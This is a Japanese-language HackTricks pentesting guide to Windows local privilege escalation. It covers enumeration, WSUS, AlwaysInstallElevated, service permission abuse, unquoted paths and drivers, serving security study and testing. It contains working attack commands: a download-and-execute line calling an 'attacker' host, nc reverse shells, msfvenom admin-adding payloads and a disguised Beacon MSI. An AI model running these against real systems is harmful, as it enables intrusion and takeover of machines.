# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基本理論

### Access Tokens

**Windows Access Tokens を知らない場合は、続行する前に次のページを読んでください：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs についての詳細は次のページを確認してください：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の Integrity Levels を知らない場合は、続行する前に次のページを読んでください：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows のセキュリティ制御

Windows には、システムの列挙を妨げたり、実行ファイルの実行を阻止したり、あるいはあなたの活動を検出したりするさまざまな機能があります。privilege escalation の列挙を開始する前に、次のページを読み、これらの防御メカニズムをすべて列挙するべきです：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

RAiLaunchAdminProcess を通して起動された UIAccess プロセスは、AppInfo secure-path チェックがバイパスされた場合、プロンプトなしで High IL に到達するために悪用される可能性があります。専用の UIAccess/Admin Protection バイパス ワークフローはここを確認してください：


{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## システム情報

### バージョン情報の列挙

Windows のバージョンに既知の脆弱性があるか確認してください（適用されているパッチも確認すること）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) はMicrosoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。 このデータベースには4,700件以上のセキュリティ脆弱性が含まれており、Windows環境が持つ**massive attack surface**を示しています。

**システム上で**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**システム情報を使ってローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

env variablesにcredential/Juicy infoが保存されていますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell の履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell のトランスクリプトファイル

有効にする方法は [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) を参照してください。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell のパイプライン実行の詳細が記録されます。実行されたコマンド、コマンドの呼び出し、スクリプトの一部などが含まれます。ただし、実行の全詳細や出力結果が完全に記録されない場合があります。

有効にするには、ドキュメントの "Transcript files" セクションの手順に従い、**"Module Logging"** を "Powershell Transcription" の代わりに選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの最後の15件のイベントを表示するには、次を実行します:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全な活動ログと全文の内容が取得され、各コードブロックが実行時に記録されることが保証されます。  
このプロセスは各活動の包括的な監査証跡を保持し、フォレンジックや悪意のある挙動の解析に役立ちます。  
実行時にすべての活動を記録することで、プロセスに関する詳細な洞察が得られます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\  
最後の20件のイベントを表示するには、次のコマンドを使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新のリクエストが http**S** ではなく http で行われている場合、システムを侵害できる可能性があります。

まず、ネットワークが非SSLの WSUS 更新を使用しているかを確認するために、cmd で次のコマンドを実行します:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell で次のように:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような応答が返ってきた場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` に等しい場合。

その場合、**悪用可能です。** 最後のレジストリが `0` の場合、WSUS エントリは無視されます。

この脆弱性を悪用するためには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) のようなツールを使用できます。これらは非SSLのWSUSトラフィックに 'fake' なアップデートを注入するための MiTM 武装エクスプロイトスクリプトです。

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
基本的に、この脆弱性は次の欠陥を悪用します：

> もしローカルユーザーの proxy を変更する権限があり、Windows Updates が Internet Explorer の設定で構成された proxy を使用している場合、ローカルで [PyWSUS](https://github.com/GoSecure/pywsus) を実行して自身のトラフィックを傍受し、アセット上で昇格したユーザーとしてコードを実行する権限を得られます。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。WSUS ホスト名用に自己署名証明書を生成し、それを現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを傍受できます。WSUS は HSTS のような仕組みによる初回信頼（trust-on-first-use）型の検証を実装しておらず、提示された証明書がユーザーにより信頼され、かつホスト名が一致していればサービスはそれを受け入れます。

この脆弱性はツール [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) を使って悪用できます（公開されたら）。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのエンタープライズエージェントは localhost の IPC インターフェースと特権的なアップデートチャネルを公開しています。enrollment を攻撃者のサーバに強制でき、updater が rogue root CA を信頼するか署名チェックが弱い場合、ローカルユーザーは SYSTEM サービスがインストールする悪意ある MSI を配信できます。一般化した手法（Netskope stAgentSvc チェーンに基づく – CVE-2025-0309）は以下を参照してください：

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` は **TCP/9401** で localhost サービスを公開しており、攻撃者制御のメッセージを処理して **NT AUTHORITY\SYSTEM** として任意のコマンドを実行できるようにします。

- **Recon**: リスナーとバージョンを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: 必要な Veeam DLL と共に `VeeamHax.exe` のような PoC を同一ディレクトリに置き、ローカルソケット経由で SYSTEM ペイロードをトリガーします：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
そのサービスはコマンドを SYSTEM として実行します。

## KrbRelayUp

特定の条件下で、Windows **domain** 環境において、**local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing is not enforced,** ユーザーが **self-rights** を持ち **Resource-Based Constrained Delegation (RBCD)** を設定できること、そしてユーザーがドメイン内にコンピュータを作成できる能力が含まれます。これらの**requirements**は**default settings**で満たされる点に注意してください。

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** これら2つのレジストリが **enabled**（値が **0x1**）になっている場合、権限に関係なくユーザーは `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として **install**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
もし meterpreter セッションがある場合、このテクニックはモジュール **`exploit/windows/local/always_install_elevated`** を使って自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` コマンドを使用して、カレントディレクトリ内に権限昇格用の Windows MSI バイナリを作成します。このスクリプトは、ユーザー/グループ追加を促す事前コンパイル済みの MSI インストーラを書き出します（そのため GIU アクセスが必要です）：
```
Write-UserAddMSI
```
作成したバイナリを実行して権限を昇格させてください。

### MSIラッパー

このチュートリアルを読んで、これらのツールを使って MSI ラッパーを作成する方法を学んでください。もし **コマンドライン** を **実行** したいだけであれば、**.bat** ファイルをラップすることもできます。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIXでMSIを作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual StudioでMSIを作成

- **生成**: Cobalt Strike または Metasploit を使って `C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を生成します
- **Visual Studio** を開き、**Create a new project** を選択して検索ボックスに "installer" と入力します。**Setup Wizard** プロジェクトを選択して **Next** をクリックします。
- プロジェクトに **AlwaysPrivesc** などの名前を付け、場所には **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して **Create** をクリックします。
- ステップ3/4（含めるファイルを選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックして先ほど生成した Beacon ペイロードを選択し、**Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** プロジェクトを選択し、**Properties** 内で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、変更できる他のプロパティもあり、インストールされたアプリをより正当らしく見せることができます。
- プロジェクトを右クリックして **View > Custom Actions** を選択します。
- **Install** を右クリックして **Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** ファイルを選択して **OK** をクリックします。これにより、インストーラが実行されるとすぐに Beacon ペイロードが実行されるようになります。
- **Custom Action Properties** の下で **Run64Bit** を **True** に変更します。
- 最後に、**ビルドする**。
- 警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` が表示された場合は、プラットフォームを x64 に設定していることを確認してください。

### MSIのインストール

悪意のある `.msi` ファイルの**インストール**をバックグラウンドで実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検知

### 監査設定

これらの設定は何が**記録されるか**を決定するため、注意を払うべきです
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding は、ログがどこに送信されているかを把握することが重要です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、ドメインに参加しているコンピュータ上の **local Administrator passwords** の管理のために設計されており、各パスワードが **一意でランダム化され、定期的に更新される** ようにします。これらのパスワードは Active Directory に安全に格納され、ACLs を通じて十分な権限が付与されたユーザのみが、許可されていれば local admin passwords を閲覧できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**このページの WDigest に関する詳細**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA 保護

**Windows 8.1**以降、MicrosoftはLocal Security Authority (LSA) に対する保護を強化し、信頼されていないプロセスがそのメモリを**読み取る**ことやコードを注入する試みを**ブロック**して、システムをさらに保護しました。\
[**LSA 保護の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。 その目的は、デバイスに保存された credentials を pass-the-hash attacks のような脅威から保護することです。| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** は **Local Security Authority** (LSA) によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオン情報が登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーの domain credentials が確立されます。\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループを列挙する

所属しているグループに興味深い権限があるか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが何らかの特権グループに属している場合、権限を昇格できる可能性があります。特権グループやそれを悪用して権限を昇格させる方法については、以下を参照してください：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**token** が何かについての詳細はこのページを参照してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
以下のページで、**interesting tokens** とそれらを悪用する方法について学んでください：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログオンユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず、プロセスを列挙して、**プロセスのコマンドライン内にパスワードがないかを確認する**。\
実行中の **overwrite some binary running** を上書きできるか、あるいは binary フォルダに書き込み権限があるかを確認して、可能な [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できるか調べる:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に[**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)が実行されていないか確認してください。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが配置されているフォルダの権限を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリのパスワードマイニング

sysinternalsの**procdump**を使って、実行中プロセスのメモリダンプを作成できます。FTPのようなサービスはメモリ内に**平文の認証情報**を持っていることがあるため、メモリをダンプして認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 安全でない GUI アプリ

**SYSTEM として実行されているアプリケーションは、ユーザーが CMD を起動したり、ディレクトリを参照したりできることがある。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリック

## サービス

Service Triggers により、特定の条件が発生したときに Windows がサービスを起動できる（named pipe/RPC endpoint のアクティビティ、ETW イベント、IP 利用可能性、デバイス到着、GPO リフレッシュなど）。SERVICE_START 権限がなくても、トリガーを発火させることで特権サービスを起動できることが多い。列挙および有効化の手法は次を参照:

-
{{#ref}}
service-triggers.md
{{#endref}}

サービスの一覧を取得する:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

サービスの情報を取得するには、**sc** を使用できます。
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するために、_Sysinternals_ のバイナリ **accesschk** を用意しておくことをおすすめします。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" が任意のサービスを変更できるか確認することを推奨します:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のエラーが発生している場合（例: SSDPSRV）:

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

以下のコマンドで有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost は動作するために SSDPSRV に依存していることに注意してください (XP SP1 の場合)**

**この問題の別の回避策** は次を実行することです:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

サービスに対して "Authenticated users" グループが **SERVICE_ALL_ACCESS** を保持している場合、サービスの実行バイナリを変更することが可能です。変更して **sc** を実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
以下のような権限を通じて権限昇格が可能です:

- **SERVICE_CHANGE_CONFIG**: サービスの実行バイナリの再構成を許可します。
- **WRITE_DAC**: アクセス権の再設定を可能にし、サービス構成の変更ができるようになります。
- **WRITE_OWNER**: 所有権の取得およびアクセス権の再設定を許可します。
- **GENERIC_WRITE**: サービス構成を変更する能力を含みます。
- **GENERIC_ALL**: 同様にサービス構成を変更する能力を含みます。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

**サービスによって実行されるバイナリを変更できるか確認してください** または **バイナリが置かれているフォルダに書き込み権限があるか確認してください** ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
サービスによって実行されるすべてのバイナリは **wmic** を使って取得でき（system32 ではない）、権限は **icacls** で確認できます:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また **sc** と **icacls** を使用することもできます:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービス レジストリの変更権限

任意のサービス レジストリを変更できるか確認する必要があります.\
以下の方法でサービス **レジストリ** に対する **権限** を **確認** できます:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
サービスが実行するバイナリを変更できるかどうか、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。もしそうであれば、サービスによって実行されるバイナリを改変できます。

実行されるバイナリの Path を変更するには:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry の AppendData/AddSubdirectory 権限

レジストリに対してこの権限を持っている場合、**このレジストリの下にサブレジストリを作成できる**ことを意味します。Windows services の場合、これは **任意のコードを実行するのに十分です:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows はスペースの前までの各区切りを実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のように実行を試みます:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込みの Windows サービスに属するものを除き、引用符で囲まれていないサービスパスをすべて列挙:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は metasploit を使用して検出および悪用できます**: `exploit/windows/local/trusted\_service\_path` 手動でサービスバイナリを作成するには metasploit を使用できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 復旧アクション

Windowsでは、サービスが失敗した場合に実行するアクションをユーザーが指定できる。この機能は binary を指すように設定できる。もしその binary が置き換え可能であれば、privilege escalation が発生する可能性がある。詳細は [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) を参照。

## アプリケーション

### インストール済みアプリケーション

確認する: **permissions of the binaries** (maybe you can overwrite one and escalate privileges) および **folders** の **permissions**（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

設定ファイルを変更して特定のファイルを読み取れるか、または Administrator アカウントによって実行されるバイナリ（schedtasks）を変更できるかを確認する。

システム内の弱いフォルダ/ファイルの権限を見つける方法の一つは次のとおり:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload 永続化/実行

Notepad++ は `plugins` サブフォルダ以下のプラグイン DLL を自動ロードします。書き込み可能な portable/copy インストールが存在する場合、悪意あるプラグインを配置すると、`notepad++.exe` 内で（`DllMain` やプラグインのコールバックからも含めて）起動ごとに自動的にコードが実行されます。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリやバイナリを上書きできるか確認してください。**\
**読んで** **次のページ** 、興味深い **autoruns の場所（特権昇格に関連）** について詳しく学んでください:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバ

可能性のある **サードパーティの怪しい/vulnerable** ドライバを探してください
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
ドライバが任意のカーネル読み書きプリミティブを公開している場合（不適切に設計された IOCTL ハンドラでよく見られる）、カーネルメモリから直接 SYSTEM トークンを盗むことで権限昇格できます。手順付きの技術は以下を参照してください：

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager パスを開くようなレースコンディション脆弱性では、ルックアップを意図的に遅らせる（最大長コンポーネントや深いディレクトリチェーンを使用）ことで、ウィンドウをマイクロ秒から数十マイクロ秒に延ばせます：

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

